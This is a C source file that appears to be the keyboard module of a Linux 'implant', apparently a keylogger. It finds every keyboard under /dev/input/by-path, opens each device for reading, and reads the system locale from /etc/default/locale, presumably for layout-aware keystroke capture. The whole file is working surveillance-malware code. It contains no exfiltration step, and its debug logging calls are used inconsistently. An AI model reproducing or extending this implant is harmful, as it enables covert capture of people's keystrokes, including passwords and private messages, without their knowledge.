
/*
    keyboard handling and local support.
*/


#include "implant.h"

#include <errno.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/queue.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>


static int is_kbd(const struct dirent *f) {
    size_t len = strlen(f->d_name);

    if (len < 3)
        return 0;

    return f->d_name[len - 3] == 'k' && f->d_name[len - 2] == 'b' && f->d_name[len - 1] == 'd';
}


void fetch_available_keyboards(implant_t *instance) {

    /*
        input devices usually live in /dev/input/

        you can identify the in the by-path subdirectory, which maps each
        device name to a symlink

        here, we will return set an array of file-descriptor for each available
        keyboard on the machine, it should be appended with a -1 that should serve
        as a NULL value
    */

    struct dirent **char_devices = NULL;
    int possible_paths = scandir(
        "/dev/input/by-path/",
        &char_devices,
        &is_kbd,
        &alphasort
    );

    if (-1 == possible_paths || 0 > chdir("/dev/input/by-path/")) {

#ifdef DEBUG
        DEBUG_LOG("could not find possible keyboard paths");
#endif

        return;
    }

    /* prepare TAILQ  */
    TAILQ_INIT(&instance->kbd);

    char rpath[2048] = {0};
    for (int ctr = -1; ++ctr < possible_paths;) {
        if (!realpath(char_devices[ctr]->d_name, rpath)) {

#ifdef DEBUG
            DEBUG_LOG(
                instance->debug_enabled,
                "[!] Could not run realpath(%s): %s",
                char_devices[ctr]->d_name, strerror(errno)
            );
#endif

            continue;
        }


        keyboard_t *kbd = malloc(sizeof(keyboard_t));
        if (!kbd) {

#ifdef DEBUG
            DEBUG_LOG("[!] allocate memory for keyboard_t");
#endif

            continue;
        }


        kbd->fd = open(rpath, O_RDONLY | O_NOCTTY | O_NDELAY);
        if (kbd->fd < 0) {

#ifdef DEBUG
            DEBUG_LOG("[!] Could not open %s: %s", rpath, strerror(errno));
#endif

            continue;
        }

        strncpy(kbd->name, rpath, 63);
        TAILQ_INSERT_HEAD(&instance->kbd, kbd, devices);
    }

    for (int ctr = -1; ++ctr < possible_paths;)
        free(char_devices[ctr]);
    free(char_devices);
}


static int parse_locale(char const *locale_fpath, implant_t *instance) {

    char *buffer = NULL;
    if (ERROR == read_file(locale_fpath, &buffer))
        return ERROR;

    char **tab = tabgen(buffer, '\n');
    if (!tab) {

#ifdef DEBUG
        DEBUG_LOG("[!] Could not split buffer contents: %s", buffer);
#endif

        free(buffer);
        return ERROR;
    }

    for (size_t i = 0; i < get_array_size((uint8_t **)tab); i++) {

        if (!strncmp(tab[i], "LANG=", 5)) {
            strncpy(instance->locale, tab[i] + 5, 20);

            /* safe to free all this and exit this function */
            free_tab((uint8_t **)tab);
            free(buffer);
            return SUCCESSFUL;
        }
    }

#ifdef DEBUG
    DEBUG_LOG("\n[!] Could not retrieve locale from %s", buffer);
#endif

    free_tab((uint8_t **)tab);
    free(buffer);
    return ERROR;
}


int get_locale(implant_t *instance) {

    /*
        function call is wrapped in order to support multiple distros
        down the line.

        AFAIK, most linux distros do it like this, but this might not work for *BSD
        for instance.
    */

    return parse_locale("/etc/default/locale", instance);
}
